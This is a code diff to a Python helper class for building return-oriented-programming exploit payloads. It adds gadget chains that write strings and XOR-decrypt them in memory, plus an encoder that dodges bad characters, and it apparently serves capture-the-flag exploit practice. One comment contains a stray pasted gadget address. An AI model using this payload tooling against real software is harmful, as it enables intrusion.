@@ -47,20 +47,45 @@ class PAPA_ROP:
             log.failure("Unknown architecture: " + arch)
             exit(1) 
     
-    # Write a string to a location using pop and mov gadgets
+    # Write a string to a location using pop and mov gadgets:
     #       pop rDST; pop rSRC; ret (pop gadget)
-    #       mov [rDST], rSRC; ret   (mov gadget)
-    # TODO - fix for when rDST and rSRC are swapped
-    def pop_mov_write(self, pop, mov, what, where):
+    #       mov [rDST], rSRC; ret   0x08048899: pop esi; pop edi; ret;(mov gadget)
+    # The reverse parameter implies that rDST and rSRC are not in the same order
+    # between the gadgets:
+    def pop_mov_write(self, pop, mov, what, where, reverse = False):
         payload = ""
         nbytes = 8 if ("64" in self.arch) else 4
         while (what):
             payload += self.p(pop)
-            payload += self.p(where)
-            payload += what[:nbytes]
+            if (reverse):
+                payload += what[:nbytes]              
+                payload += self.p(where)
+            else:
+                payload += self.p(where)
+                payload += what[:nbytes]
             payload += self.p(mov)
             what = what[nbytes:]
             where += nbytes
+        return payload
+
+    # XOR the bytes at a given address with a specified key using pop and
+    # xor gadgets:
+    #   pop rCIP; pop rKEY; ret;
+    #   xor byte ptr rCIP, rKEY; ret;
+    # The reverse parameter implies that rCIP and rKEY are not in the same
+    # order between the gadgets
+    def xor_decrypt(self, pop, xor, cipher_addr, key, reverse=False):
+        payload = ""
+        for key_char in key:
+            payload += self.p(pop)
+            if (reverse):
+                payload += self.p(ord(key_char))
+                payload += self.p(cipher_addr)
+            else:
+                payload += self.p(cipher_addr)
+                payload += self.p(ord(key_char))
+            payload += self.p(xor)
+            cipher_addr += 1
         return payload
 
     ########################################
@@ -126,4 +151,38 @@ class PAPA_ROP:
             sub = core.read(core.rsp, 4)
 
         return cyclic_find(sub)
+
+    # XOR encode to avoid bad characters in a string
+    # "what" is the string to encode
+    # "avoid" is a byte array of bad chars
+    # Returns a (cipher, decrypt_key) tuple
+    def xor_encode(self, what, avoid):
+        cipher = ""
+        decrypt_key = ""
+        # Encode each character
+        for char in what:
+            plain = ord(char)
+            # Check the character actually needs encoding
+            if ((plain in avoid) or (0 in avoid)):
+                # Find character to encode with
+                found = False
+                for key in range(256):
+                    if ((key in avoid) or (plain ^ key in avoid)):
+                        continue
+                    cipher += chr(plain ^ key)
+                    decrypt_key += chr(key)
+                    found = True
+                    break
+
+                # Error if couldn't do conversion
+                if (not found):
+                    log.failure("Couldn't XOR encode: " + char)
+                    exit(1)
+
+            # Otherwise just xor with null
+            else:
+                cipher += char
+                decrypt_key += "\x00"
+
+        return (cipher, decrypt_key)
 
